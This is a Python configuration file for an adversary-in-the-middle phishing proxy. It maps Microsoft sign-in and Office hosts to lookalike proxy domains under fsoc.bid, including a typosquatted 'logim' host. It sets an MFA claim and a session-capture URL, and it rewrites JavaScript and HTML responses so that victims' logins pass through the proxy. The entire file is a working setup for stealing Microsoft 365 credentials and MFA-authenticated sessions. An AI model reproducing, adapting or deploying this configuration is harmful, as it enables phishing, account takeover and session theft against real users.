"""
AiTM Config
"""

from __future__ import annotations

from .helpers.config import Config

config = Config(
    mfa_claim='{"id_token":{"amr":{"essential":true,"values":["mfa"]}},'
    '"access_token":{"amr":{"essential":true,"values":["mfa"]}}}',
    auth_url=["/kmsi"],
    local_upstream_hostname="local.upstream.host",
)

config.targets = [
    {"origin": "mysignins.microsoft.com", "proxy": "mysignins-dev.fsoc.bid", "port": 6000},
    {"origin": "login.microsoftonline.com", "proxy": "login-dev.fsoc.bid", "port": 6001},
    {"origin": "login.microsoft.com", "proxy": "logim-dev.fsoc.bid", "port": 6002},
    {"origin": "office.com", "proxy": "office-dev.fsoc.bid", "port": 6003},
]
config.content_types = [
    "text/html",
    "application/json",
    "application/javascript",
    "application/x-javascript",
]

config.custom_modifications = [
    {
        "mimes": ["application/javascript", "application/x-javascript"],
        "sites": ["mysignins.microsoft.com"],
        "search": "login.windows-ppe.net",
        "replace": "login-dev.fsoc.bid",
    },
    {
        "mimes": ["text/html"],
        "sites": ["login.microsoftonline.com"],
        "search": '"isDefault":true',
        "replace": '"isDefault":false',
    },
]
